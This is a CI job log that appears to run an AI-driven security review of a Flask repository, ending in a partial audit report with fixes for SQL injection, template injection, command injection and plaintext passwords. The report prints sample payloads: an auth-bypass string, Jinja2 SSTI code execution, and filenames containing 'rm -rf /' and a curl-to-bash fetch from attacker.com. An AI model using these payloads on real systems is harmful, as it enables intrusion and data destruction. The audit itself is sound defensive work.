@@ -1,0 +1,2669 @@
+﻿2026-08-24T17:54:41.3104932Z Current runner version: '2.336.0'
+2026-08-24T17:54:41.3123592Z ##[group]Runner Image Provisioner
+2026-08-24T17:54:41.3124415Z Hosted Compute Agent
+2026-08-24T17:54:41.3124916Z Version: 20260729.566
+2026-08-24T17:54:41.3125484Z Commit: cf7153fe6e25b664e8693c24944bf2b00355d109
+2026-08-24T17:54:41.3126167Z Build Date: 2026-07-29T19:17:02Z
+2026-08-24T17:54:41.3126778Z Worker ID: {3e6342dd-0761-4275-936d-cb6f5eb02130}
+2026-08-24T17:54:41.3127378Z Azure Region: westus3
+2026-08-24T17:54:41.3127854Z ##[endgroup]
+2026-08-24T17:54:41.3128933Z ##[group]Operating System
+2026-08-24T17:54:41.3129476Z Ubuntu
+2026-08-24T17:54:41.3129942Z 24.04.4
+2026-08-24T17:54:41.3130483Z LTS
+2026-08-24T17:54:41.3130925Z ##[endgroup]
+2026-08-24T17:54:41.3131380Z ##[group]Runner Image
+2026-08-24T17:54:41.3132127Z Image: ubuntu-24.04
+2026-08-24T17:54:41.3132628Z Version: 20260816.277.1
+2026-08-24T17:54:41.3133678Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20260816.277/images/ubuntu/Ubuntu2404-Readme.md
+2026-08-24T17:54:41.3134912Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20260816.277
+2026-08-24T17:54:41.3135805Z ##[endgroup]
+2026-08-24T17:54:41.3137098Z ##[group]GITHUB_TOKEN Permissions
+2026-08-24T17:54:41.3139102Z Contents: read
+2026-08-24T17:54:41.3139586Z Metadata: read
+2026-08-24T17:54:41.3140073Z Packages: read
+2026-08-24T17:54:41.3140550Z ##[endgroup]
+2026-08-24T17:54:41.3142708Z Secret source: Actions
+2026-08-24T17:54:41.3143613Z Prepare workflow directory
+2026-08-24T17:54:41.3399110Z Prepare all required actions
+2026-08-24T17:54:41.3439602Z Getting action download info
+2026-08-24T17:54:41.6817128Z Download action repository 'actions/checkout@v3' (SHA:a37ce9120846195fa4ece8f58b268e6043cb2f26)
+2026-08-24T17:54:41.7830815Z Download action repository 'actions/setup-python@v4' (SHA:7f4fc3e22c37d6ff65e88745f38bd3157c663f7c)
+2026-08-24T17:54:41.8687884Z Download action repository 'actions/upload-artifact@v4' (SHA:ea165f8d65b6e75b540449e92b4886f43607fa02)
+2026-08-24T17:54:42.0686653Z Complete job name: Claude Sonnet Security Review (Neutral Prompt)
+2026-08-24T17:54:42.1324281Z Node 20 is being deprecated. This workflow is running with Node 24 by default. If you need to temporarily use Node 20, you can set the ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true environment variable. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
+2026-08-24T17:54:42.1331382Z ##[group]Run actions/checkout@v3
+2026-08-24T17:54:42.1332222Z with:
+2026-08-24T17:54:42.1332694Z   repository: WillKirk/dissertation-pipeline
+2026-08-24T17:54:42.1336228Z   token: ***
+2026-08-24T17:54:42.1336679Z   ssh-strict: true
+2026-08-24T17:54:42.1337143Z   persist-credentials: true
+2026-08-24T17:54:42.1337620Z   clean: true
+2026-08-24T17:54:42.1338046Z   sparse-checkout-cone-mode: true
+2026-08-24T17:54:42.1338574Z   fetch-depth: 1
+2026-08-24T17:54:42.1339024Z   fetch-tags: false
+2026-08-24T17:54:42.1339482Z   lfs: false
+2026-08-24T17:54:42.1339887Z   submodules: false
+2026-08-24T17:54:42.1340341Z   set-safe-directory: true
+2026-08-24T17:54:42.1340950Z   allow-unsafe-pr-checkout: false
+2026-08-24T17:54:42.1341525Z ##[endgroup]
+2026-08-24T17:54:42.2066493Z (node:1965) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-08-24T17:54:42.2081543Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-08-24T17:54:42.2147875Z Syncing repository: WillKirk/dissertation-pipeline
+2026-08-24T17:54:42.2149481Z ##[group]Getting Git version info
+2026-08-24T17:54:42.2150250Z Working directory is '/home/runner/work/dissertation-pipeline/dissertation-pipeline'
+2026-08-24T17:54:42.2151365Z [command]/usr/bin/git version
+2026-08-24T17:54:42.2203902Z git version 2.55.0
+2026-08-24T17:54:42.2219852Z ##[endgroup]
+2026-08-24T17:54:42.2229807Z Temporarily overriding HOME='/home/runner/work/_temp/b4039813-1c78-413d-bb3b-67771f81305b' before making global git config changes
+2026-08-24T17:54:42.2231153Z Adding repository directory to the temporary git global config as a safe directory
+2026-08-24T17:54:42.2232831Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/dissertation-pipeline/dissertation-pipeline
+2026-08-24T17:54:42.2279278Z Deleting the contents of '/home/runner/work/dissertation-pipeline/dissertation-pipeline'
+2026-08-24T17:54:42.2282698Z ##[group]Initializing the repository
+2026-08-24T17:54:42.2285990Z [command]/usr/bin/git init /home/runner/work/dissertation-pipeline/dissertation-pipeline
+2026-08-24T17:54:42.2369095Z hint: Using 'master' as the name for the initial branch. This default branch name
+2026-08-24T17:54:42.2370326Z hint: will change to "main" in Git 3.0. To configure the initial branch name
+2026-08-24T17:54:42.2371964Z hint: to use in all of your new repositories, which will suppress this warning,
+2026-08-24T17:54:42.2373113Z hint: call:
+2026-08-24T17:54:42.2373740Z hint:
+2026-08-24T17:54:42.2374495Z hint: 	git config --global init.defaultBranch <name>
+2026-08-24T17:54:42.2375415Z hint:
+2026-08-24T17:54:42.2376247Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+2026-08-24T17:54:42.2377572Z hint: 'development'. The just-created branch can be renamed via this command:
+2026-08-24T17:54:42.2378522Z hint:
+2026-08-24T17:54:42.2379166Z hint: 	git branch -m <name>
+2026-08-24T17:54:42.2379823Z hint:
+2026-08-24T17:54:42.2380584Z hint: Disable this message with "git config set advice.defaultBranchName false"
+2026-08-24T17:54:42.2382258Z Initialized empty Git repository in /home/runner/work/dissertation-pipeline/dissertation-pipeline/.git/
+2026-08-24T17:54:42.2384639Z [command]/usr/bin/git remote add origin https://github.com/WillKirk/dissertation-pipeline
+2026-08-24T17:54:42.2412418Z ##[endgroup]
+2026-08-24T17:54:42.2413546Z ##[group]Disabling automatic garbage collection
+2026-08-24T17:54:42.2414647Z [command]/usr/bin/git config --local gc.auto 0
+2026-08-24T17:54:42.2435263Z ##[endgroup]
+2026-08-24T17:54:42.2436231Z ##[group]Setting up auth
+2026-08-24T17:54:42.2440398Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-08-24T17:54:42.2461852Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-08-24T17:54:42.2731009Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-08-24T17:54:42.2752723Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-08-24T17:54:42.2922434Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
+2026-08-24T17:54:42.2944392Z ##[endgroup]
+2026-08-24T17:54:42.2945264Z ##[group]Fetching the repository
+2026-08-24T17:54:42.2950469Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --progress --no-recurse-submodules --depth=1 origin +7dd48a14977fb3e53725639d97ad8807181918f6:refs/remotes/origin/main
+2026-08-24T17:54:42.7081582Z remote: Enumerating objects: 25, done.        
+2026-08-24T17:54:42.7082938Z remote: Counting objects:   4% (1/25)        
+2026-08-24T17:54:42.7083637Z remote: Counting objects:   8% (2/25)        
+2026-08-24T17:54:42.7084301Z remote: Counting objects:  12% (3/25)        
+2026-08-24T17:54:42.7085130Z remote: Counting objects:  16% (4/25)        
+2026-08-24T17:54:42.7086010Z remote: Counting objects:  20% (5/25)        
+2026-08-24T17:54:42.7086703Z remote: Counting objects:  24% (6/25)        
+2026-08-24T17:54:42.7087372Z remote: Counting objects:  28% (7/25)        
+2026-08-24T17:54:42.7088023Z remote: Counting objects:  32% (8/25)        
+2026-08-24T17:54:42.7088766Z remote: Counting objects:  36% (9/25)        
+2026-08-24T17:54:42.7089443Z remote: Counting objects:  40% (10/25)        
+2026-08-24T17:54:42.7090172Z remote: Counting objects:  44% (11/25)        
+2026-08-24T17:54:42.7091478Z remote: Counting objects:  48% (12/25)        
+2026-08-24T17:54:42.7092562Z remote: Counting objects:  52% (13/25)        
+2026-08-24T17:54:42.7093545Z remote: Counting objects:  56% (14/25)        
+2026-08-24T17:54:42.7094621Z remote: Counting objects:  60% (15/25)        
+2026-08-24T17:54:42.7095327Z remote: Counting objects:  64% (16/25)        
+2026-08-24T17:54:42.7095979Z remote: Counting objects:  68% (17/25)        
+2026-08-24T17:54:42.7096618Z remote: Counting objects:  72% (18/25)        
+2026-08-24T17:54:42.7097299Z remote: Counting objects:  76% (19/25)        
+2026-08-24T17:54:42.7097986Z remote: Counting objects:  80% (20/25)        
+2026-08-24T17:54:42.7098768Z remote: Counting objects:  84% (21/25)        
+2026-08-24T17:54:42.7099425Z remote: Counting objects:  88% (22/25)        
+2026-08-24T17:54:42.7100070Z remote: Counting objects:  92% (23/25)        
+2026-08-24T17:54:42.7100752Z remote: Counting objects:  96% (24/25)        
+2026-08-24T17:54:42.7101485Z remote: Counting objects: 100% (25/25)        
+2026-08-24T17:54:42.7102531Z remote: Counting objects: 100% (25/25), done.        
+2026-08-24T17:54:42.7103257Z remote: Compressing objects:   4% (1/22)        
+2026-08-24T17:54:42.7103921Z remote: Compressing objects:   9% (2/22)        
+2026-08-24T17:54:42.7104627Z remote: Compressing objects:  13% (3/22)        
+2026-08-24T17:54:42.7105324Z remote: Compressing objects:  18% (4/22)        
+2026-08-24T17:54:42.7106035Z remote: Compressing objects:  22% (5/22)        
+2026-08-24T17:54:42.7106700Z remote: Compressing objects:  27% (6/22)        
+2026-08-24T17:54:42.7107348Z remote: Compressing objects:  31% (7/22)        
+2026-08-24T17:54:42.7108120Z remote: Compressing objects:  36% (8/22)        
+2026-08-24T17:54:42.7108847Z remote: Compressing objects:  40% (9/22)        
+2026-08-24T17:54:42.7109574Z remote: Compressing objects:  45% (10/22)        
+2026-08-24T17:54:42.7110428Z remote: Compressing objects:  50% (11/22)        
+2026-08-24T17:54:42.7111237Z remote: Compressing objects:  54% (12/22)        
+2026-08-24T17:54:42.7112445Z remote: Compressing objects:  59% (13/22)        
+2026-08-24T17:54:42.7113114Z remote: Compressing objects:  63% (14/22)        
+2026-08-24T17:54:42.7113962Z remote: Compressing objects:  68% (15/22)        
+2026-08-24T17:54:42.7114845Z remote: Compressing objects:  72% (16/22)        
+2026-08-24T17:54:42.7115482Z remote: Compressing objects:  77% (17/22)        
+2026-08-24T17:54:42.7116186Z remote: Compressing objects:  81% (18/22)        
+2026-08-24T17:54:42.7116909Z remote: Compressing objects:  86% (19/22)        
+2026-08-24T17:54:42.7117893Z remote: Compressing objects:  90% (20/22)        
+2026-08-24T17:54:42.7118858Z remote: Compressing objects:  95% (21/22)        
+2026-08-24T17:54:42.7119821Z remote: Compressing objects: 100% (22/22)        
+2026-08-24T17:54:42.7120931Z remote: Compressing objects: 100% (22/22), done.        
+2026-08-24T17:54:42.7122468Z remote: Total 25 (delta 1), reused 14 (delta 0), pack-reused 0 (from 0)        
+2026-08-24T17:54:42.7201143Z From https://github.com/WillKirk/dissertation-pipeline
+2026-08-24T17:54:42.7202225Z  * [new ref]         7dd48a14977fb3e53725639d97ad8807181918f6 -> origin/main
+2026-08-24T17:54:42.7204661Z ##[endgroup]
+2026-08-24T17:54:42.7205480Z ##[group]Determining the checkout info
+2026-08-24T17:54:42.7206482Z ##[endgroup]
+2026-08-24T17:54:42.7207312Z ##[group]Checking out the ref
+2026-08-24T17:54:42.7209388Z [command]/usr/bin/git checkout --progress --force -B main refs/remotes/origin/main
+2026-08-24T17:54:42.7255234Z Switched to a new branch 'main'
+2026-08-24T17:54:42.7258801Z branch 'main' set up to track 'origin/main'.
+2026-08-24T17:54:42.7262289Z ##[endgroup]
+2026-08-24T17:54:42.7289122Z [command]/usr/bin/git log -1 --format='%H'
+2026-08-24T17:54:42.7305177Z '7dd48a14977fb3e53725639d97ad8807181918f6'
+2026-08-24T17:54:42.7525003Z Node 20 is being deprecated. This workflow is running with Node 24 by default. If you need to temporarily use Node 20, you can set the ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true environment variable. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
+2026-08-24T17:54:42.7527428Z ##[group]Run actions/setup-python@v4
+2026-08-24T17:54:42.7528027Z with:
+2026-08-24T17:54:42.7528434Z   python-version: 3.10
+2026-08-24T17:54:42.7528892Z   check-latest: false
+2026-08-24T17:54:42.7532547Z   token: ***
+2026-08-24T17:54:42.7533057Z   update-environment: true
+2026-08-24T17:54:42.7533549Z   allow-prereleases: false
+2026-08-24T17:54:42.7534000Z ##[endgroup]
+2026-08-24T17:54:42.8671786Z ##[group]Installed versions
+2026-08-24T17:54:42.8748947Z (node:2048) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-08-24T17:54:42.8750773Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-08-24T17:54:42.8760980Z Successfully set up CPython (3.10.21)
+2026-08-24T17:54:42.8762636Z ##[endgroup]
+2026-08-24T17:54:42.8928874Z ##[group]Run pip install anthropic==0.79.0
+2026-08-24T17:54:42.8929852Z [36;1mpip install anthropic==0.79.0[0m
+2026-08-24T17:54:42.8975451Z shell: /usr/bin/bash -e {0}
+2026-08-24T17:54:42.8976185Z env:
+2026-08-24T17:54:42.8976896Z   pythonLocation: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:42.8978012Z   PKG_CONFIG_PATH: /opt/hostedtoolcache/Python/3.10.21/x64/lib/pkgconfig
+2026-08-24T17:54:42.8979253Z   Python_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:42.8980331Z   Python2_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:42.8981412Z   Python3_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:42.8982700Z   LD_LIBRARY_PATH: /opt/hostedtoolcache/Python/3.10.21/x64/lib
+2026-08-24T17:54:42.8983704Z ##[endgroup]
+2026-08-24T17:54:45.0619360Z Collecting anthropic==0.79.0
+2026-08-24T17:54:45.1225888Z   Downloading anthropic-0.79.0-py3-none-any.whl.metadata (28 kB)
+2026-08-24T17:54:45.1546834Z Collecting anyio<5,>=3.5.0 (from anthropic==0.79.0)
+2026-08-24T17:54:45.1577033Z   Downloading anyio-4.14.2-py3-none-any.whl.metadata (4.6 kB)
+2026-08-24T17:54:45.1749667Z Collecting distro<2,>=1.7.0 (from anthropic==0.79.0)
+2026-08-24T17:54:45.1779430Z   Downloading distro-1.9.0-py3-none-any.whl.metadata (6.8 kB)
+2026-08-24T17:54:45.1949687Z Collecting docstring-parser<1,>=0.15 (from anthropic==0.79.0)
+2026-08-24T17:54:45.1980015Z   Downloading docstring_parser-0.18.0-py3-none-any.whl.metadata (3.5 kB)
+2026-08-24T17:54:45.2209320Z Collecting httpx<1,>=0.25.0 (from anthropic==0.79.0)
+2026-08-24T17:54:45.2239798Z   Downloading httpx-0.28.1-py3-none-any.whl.metadata (7.1 kB)
+2026-08-24T17:54:45.3314899Z Collecting jiter<1,>=0.4.0 (from anthropic==0.79.0)
+2026-08-24T17:54:45.3348522Z   Downloading jiter-0.16.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (5.2 kB)
+2026-08-24T17:54:45.4469696Z Collecting pydantic<3,>=1.9.0 (from anthropic==0.79.0)
+2026-08-24T17:54:45.4499223Z   Downloading pydantic-2.13.4-py3-none-any.whl.metadata (109 kB)
+2026-08-24T17:54:45.4722680Z Collecting sniffio (from anthropic==0.79.0)
+2026-08-24T17:54:45.4752205Z   Downloading sniffio-1.3.1-py3-none-any.whl.metadata (3.9 kB)
+2026-08-24T17:54:45.4963208Z Collecting typing-extensions<5,>=4.10 (from anthropic==0.79.0)
+2026-08-24T17:54:45.4994942Z   Downloading typing_extensions-4.16.0-py3-none-any.whl.metadata (3.3 kB)
+2026-08-24T17:54:45.5180074Z Collecting exceptiongroup>=1.0.2 (from anyio<5,>=3.5.0->anthropic==0.79.0)
+2026-08-24T17:54:45.5211424Z   Downloading exceptiongroup-1.3.1-py3-none-any.whl.metadata (6.7 kB)
+2026-08-24T17:54:45.5455963Z Collecting idna>=2.8 (from anyio<5,>=3.5.0->anthropic==0.79.0)
+2026-08-24T17:54:45.5494645Z   Downloading idna-3.19-py3-none-any.whl.metadata (9.2 kB)
+2026-08-24T17:54:45.5756376Z Collecting certifi (from httpx<1,>=0.25.0->anthropic==0.79.0)
+2026-08-24T17:54:45.5787456Z   Downloading certifi-2026.7.22-py3-none-any.whl.metadata (2.5 kB)
+2026-08-24T17:54:45.6001827Z Collecting httpcore==1.* (from httpx<1,>=0.25.0->anthropic==0.79.0)
+2026-08-24T17:54:45.6033178Z   Downloading httpcore-1.0.9-py3-none-any.whl.metadata (21 kB)
+2026-08-24T17:54:45.6223146Z Collecting h11>=0.16 (from httpcore==1.*->httpx<1,>=0.25.0->anthropic==0.79.0)
+2026-08-24T17:54:45.6254699Z   Downloading h11-0.16.0-py3-none-any.whl.metadata (8.3 kB)
+2026-08-24T17:54:45.6430140Z Collecting annotated-types>=0.6.0 (from pydantic<3,>=1.9.0->anthropic==0.79.0)
+2026-08-24T17:54:45.6463629Z   Downloading annotated_types-0.8.0-py3-none-any.whl.metadata (15 kB)
+2026-08-24T17:54:46.2727356Z Collecting pydantic-core==2.46.4 (from pydantic<3,>=1.9.0->anthropic==0.79.0)
+2026-08-24T17:54:46.2760259Z   Downloading pydantic_core-2.46.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.6 kB)
+2026-08-24T17:54:46.3126125Z Collecting typing-inspection>=0.4.2 (from pydantic<3,>=1.9.0->anthropic==0.79.0)
+2026-08-24T17:54:46.3155561Z   Downloading typing_inspection-0.4.4-py3-none-any.whl.metadata (2.6 kB)
+2026-08-24T17:54:46.3329766Z Downloading anthropic-0.79.0-py3-none-any.whl (405 kB)
+2026-08-24T17:54:46.3415950Z Downloading anyio-4.14.2-py3-none-any.whl (125 kB)
+2026-08-24T17:54:46.3474091Z Downloading distro-1.9.0-py3-none-any.whl (20 kB)
+2026-08-24T17:54:46.3526559Z Downloading docstring_parser-0.18.0-py3-none-any.whl (22 kB)
+2026-08-24T17:54:46.3583155Z Downloading httpx-0.28.1-py3-none-any.whl (73 kB)
+2026-08-24T17:54:46.3635085Z Downloading httpcore-1.0.9-py3-none-any.whl (78 kB)
+2026-08-24T17:54:46.3688620Z Downloading jiter-0.16.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (348 kB)
+2026-08-24T17:54:46.3759304Z Downloading pydantic-2.13.4-py3-none-any.whl (472 kB)
+2026-08-24T17:54:46.3828530Z Downloading pydantic_core-2.46.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
+2026-08-24T17:54:46.3954121Z    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 177.7 MB/s  0:00:00
+2026-08-24T17:54:46.3983993Z Downloading typing_extensions-4.16.0-py3-none-any.whl (45 kB)
+2026-08-24T17:54:46.4034748Z Downloading annotated_types-0.8.0-py3-none-any.whl (13 kB)
+2026-08-24T17:54:46.4084478Z Downloading exceptiongroup-1.3.1-py3-none-any.whl (16 kB)
+2026-08-24T17:54:46.4139466Z Downloading h11-0.16.0-py3-none-any.whl (37 kB)
+2026-08-24T17:54:46.4194015Z Downloading idna-3.19-py3-none-any.whl (68 kB)
+2026-08-24T17:54:46.4245756Z Downloading typing_inspection-0.4.4-py3-none-any.whl (14 kB)
+2026-08-24T17:54:46.4296520Z Downloading certifi-2026.7.22-py3-none-any.whl (136 kB)
+2026-08-24T17:54:46.4350004Z Downloading sniffio-1.3.1-py3-none-any.whl (10 kB)
+2026-08-24T17:54:46.5711278Z Installing collected packages: typing-extensions, sniffio, jiter, idna, h11, docstring-parser, distro, certifi, annotated-types, typing-inspection, pydantic-core, httpcore, exceptiongroup, pydantic, anyio, httpx, anthropic
+2026-08-24T17:54:47.2707897Z 
+2026-08-24T17:54:47.2730108Z Successfully installed annotated-types-0.8.0 anthropic-0.79.0 anyio-4.14.2 certifi-2026.7.22 distro-1.9.0 docstring-parser-0.18.0 exceptiongroup-1.3.1 h11-0.16.0 httpcore-1.0.9 httpx-0.28.1 idna-3.19 jiter-0.16.0 pydantic-2.13.4 pydantic-core-2.46.4 sniffio-1.3.1 typing-extensions-4.16.0 typing-inspection-0.4.4
+2026-08-24T17:54:47.3519954Z ##[group]Run python3 scripts/claude_scan_neutral.py
+2026-08-24T17:54:47.3520444Z [36;1mpython3 scripts/claude_scan_neutral.py[0m
+2026-08-24T17:54:47.3544572Z shell: /usr/bin/bash -e {0}
+2026-08-24T17:54:47.3544946Z env:
+2026-08-24T17:54:47.3545390Z   pythonLocation: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:47.3545897Z   PKG_CONFIG_PATH: /opt/hostedtoolcache/Python/3.10.21/x64/lib/pkgconfig
+2026-08-24T17:54:47.3546450Z   Python_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:47.3546908Z   Python2_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:47.3547373Z   Python3_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:54:47.3547853Z   LD_LIBRARY_PATH: /opt/hostedtoolcache/Python/3.10.21/x64/lib
+2026-08-24T17:54:47.3548936Z   ANTHROPIC_API_KEY: ***
+2026-08-24T17:54:47.3549276Z ##[endgroup]
+2026-08-24T17:55:46.1497145Z 
+2026-08-24T17:55:46.1498601Z === RUN 1 OF 5 ===
+2026-08-24T17:55:46.1499948Z # Security Audit Report
+2026-08-24T17:55:46.1500223Z 
+2026-08-24T17:55:46.1500499Z ## Critical Vulnerabilities
+2026-08-24T17:55:46.1500738Z 
+2026-08-24T17:55:46.1500902Z ---
+2026-08-24T17:55:46.1501116Z 
+2026-08-24T17:55:46.1501247Z ### 1. SQL Injection
+2026-08-24T17:55:46.1502227Z **File:** `./app/routes/auth.py` — `login()` function
+2026-08-24T17:55:46.1502707Z **Severity:** Critical
+2026-08-24T17:55:46.1502925Z 
+2026-08-24T17:55:46.1503073Z ```python
+2026-08-24T17:55:46.1503437Z # VULNERABLE
+2026-08-24T17:55:46.1503994Z query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+2026-08-24T17:55:46.1504680Z result = db.session.execute(query)
+2026-08-24T17:55:46.1505052Z ```
+2026-08-24T17:55:46.1505188Z 
+2026-08-24T17:55:46.1505724Z Raw string concatenation allows an attacker to manipulate the query entirely. For example, a username of `' OR '1'='1' --` would bypass authentication.
+2026-08-24T17:55:46.1506479Z 
+2026-08-24T17:55:46.1506663Z **Fix:** Use parameterised queries or the ORM:
+2026-08-24T17:55:46.1507122Z ```python
+2026-08-24T17:55:46.1507521Z # Option 1: ORM (preferred)
+2026-08-24T17:55:46.1508483Z user = User.query.filter_by(username=username, ***
+2026-08-24T17:55:46.1508826Z 
+2026-08-24T17:55:46.1509045Z # Option 2: Parameterised query
+2026-08-24T17:55:46.1509670Z query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+2026-08-24T17:55:46.1510520Z result = db.session.execute(query, {"username": username, "password": hashed_password})
+2026-08-24T17:55:46.1511182Z ```
+2026-08-24T17:55:46.1511326Z 
+2026-08-24T17:55:46.1511532Z ---
+2026-08-24T17:55:46.1511874Z 
+2026-08-24T17:55:46.1512144Z ### 2. Server-Side Template Injection (SSTI)
+2026-08-24T17:55:46.1512882Z **File:** `./app/routes/templates.py` — `render_template_custom()`
+2026-08-24T17:55:46.1513489Z **Severity:** Critical
+2026-08-24T17:55:46.1513730Z 
+2026-08-24T17:55:46.1513901Z ```python
+2026-08-24T17:55:46.1514524Z # VULNERABLE — unsandboxed Jinja2 environment with user input
+2026-08-24T17:55:46.1515108Z env = Environment()
+2026-08-24T17:55:46.1515612Z template = env.from_string(template_str)  # template_str is raw user input
+2026-08-24T17:55:46.1516263Z rendered = template.render(**context)
+2026-08-24T17:55:46.1516710Z ```
+2026-08-24T17:55:46.1516845Z 
+2026-08-24T17:55:46.1517209Z An attacker can execute arbitrary code on the server. A payload such as:
+2026-08-24T17:55:46.1517791Z ```
+2026-08-24T17:55:46.1518125Z {{ ''.__class__.__mro__[1].__subclasses__() }}
+2026-08-24T17:55:46.1518705Z {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+2026-08-24T17:55:46.1519218Z ```
+2026-08-24T17:55:46.1519383Z 
+2026-08-24T17:55:46.1519776Z **Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist inputs:
+2026-08-24T17:55:46.1520418Z ```python
+2026-08-24T17:55:46.1520816Z from jinja2.sandbox import SandboxedEnvironment
+2026-08-24T17:55:46.1521217Z 
+2026-08-24T17:55:46.1521409Z env = SandboxedEnvironment()
+2026-08-24T17:55:46.1522071Z template = env.from_string(template_str)
+2026-08-24T17:55:46.1522977Z rendered = template.render(**context)
+2026-08-24T17:55:46.1523417Z ```
+2026-08-24T17:55:46.1523871Z Ideally, avoid rendering arbitrary user-supplied templates entirely.
+2026-08-24T17:55:46.1524361Z 
+2026-08-24T17:55:46.1524486Z ---
+2026-08-24T17:55:46.1524690Z 
+2026-08-24T17:55:46.1524847Z ### 3. OS Command Injection
+2026-08-24T17:55:46.1525545Z **File:** `./app/routes/files.py` — `process_file()`
+2026-08-24T17:55:46.1526032Z **Severity:** Critical
+2026-08-24T17:55:46.1526237Z 
+2026-08-24T17:55:46.1526390Z ```python
+2026-08-24T17:55:46.1526900Z # VULNERABLE — shell=True with unsanitised user input
+2026-08-24T17:55:46.1527390Z result = subprocess.run(
+2026-08-24T17:55:46.1528092Z     "file " + filename,   # filename is raw user input
+2026-08-24T17:55:46.1528594Z     shell=True,
+2026-08-24T17:55:46.1528977Z     capture_output=True,
+2026-08-24T17:55:46.1529377Z     text=True
+2026-08-24T17:55:46.1529937Z )
+2026-08-24T17:55:46.1530292Z ```
+2026-08-24T17:55:46.1530488Z 
+2026-08-24T17:55:46.1530913Z A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` executes arbitrary commands.
+2026-08-24T17:55:46.1531395Z 
+2026-08-24T17:55:46.1531937Z **Fix:** Never use `shell=True` with user input. Pass arguments as a list:
+2026-08-24T17:55:46.1532617Z ```python
+2026-08-24T17:55:46.1532985Z import shlex
+2026-08-24T17:55:46.1533219Z 
+2026-08-24T17:55:46.1533394Z # Validate filename first
+2026-08-24T17:55:46.1533829Z if not re.match(r'^[\w\-. ]+$', filename):
+2026-08-24T17:55:46.1534396Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:55:46.1534708Z 
+2026-08-24T17:55:46.1534895Z result = subprocess.run(
+2026-08-24T17:55:46.1535378Z     ["file", filename],   # list form, no shell interpolation
+2026-08-24T17:55:46.1535908Z     shell=False,
+2026-08-24T17:55:46.1536274Z     capture_output=True,
+2026-08-24T17:55:46.1536699Z     text=True
+2026-08-24T17:55:46.1537188Z )
+2026-08-24T17:55:46.1537534Z ```
+2026-08-24T17:55:46.1537735Z 
+2026-08-24T17:55:46.1537870Z ---
+2026-08-24T17:55:46.1538081Z 
+2026-08-24T17:55:46.1538249Z ### 4. Plaintext Password Storage
+2026-08-24T17:55:46.1538867Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:55:46.1539443Z **Severity:** Critical
+2026-08-24T17:55:46.1539655Z 
+2026-08-24T17:55:46.1539855Z ```python
+2026-08-24T17:55:46.1540325Z # VULNERABLE — password stored as plaintext
+2026-08-24T17:55:46.1541095Z user = User(username=username, *** email=email)
+2026-08-24T17:55:46.1541648Z ```
+2026-08-24T17:55:46.1542092Z 
+2026-08-24T17:55:46.1542470Z If the database is compromised, all user passwords are immediately exposed.
+2026-08-24T17:55:46.1542930Z 
+2026-08-24T17:55:46.1543219Z **Fix:** Hash passwords with `bcrypt` or `werkzeug.security`:
+2026-08-24T17:55:46.1543780Z ```python
+2026-08-24T17:55:46.1544275Z from werkzeug.security import generate_password_hash, check_password_hash
+2026-08-24T17:55:46.1544738Z 
+2026-08-24T17:55:46.1544934Z # On registration
+2026-08-24T17:55:46.1545643Z user = User(username=username, *** email=email)
+2026-08-24T17:55:46.1546033Z 
+2026-08-24T17:55:46.1546190Z # On login (ORM approach)
+2026-08-24T17:55:46.1546696Z user = User.query.filter_by(username=username).first()
+2026-08-24T17:55:46.1547300Z if user and check_password_hash(user.password, password):
+2026-08-24T17:55:46.1547898Z     token = generate_token(user.id)
+2026-08-24T17:55:46.1548628Z ```
+2026-08-24T17:55:46.1548793Z 
+2026-08-24T17:55:46.1548969Z ---
+2026-08-24T17:55:46.1549183Z 
+2026-08-24T17:55:46.1549353Z ## High Vulnerabilities
+2026-08-24T17:55:46.1549612Z 
+2026-08-24T17:55:46.1549736Z ---
+2026-08-24T17:55:46.1549938Z 
+2026-08-24T17:55:46.1550130Z ### 5. Hardcoded Secrets
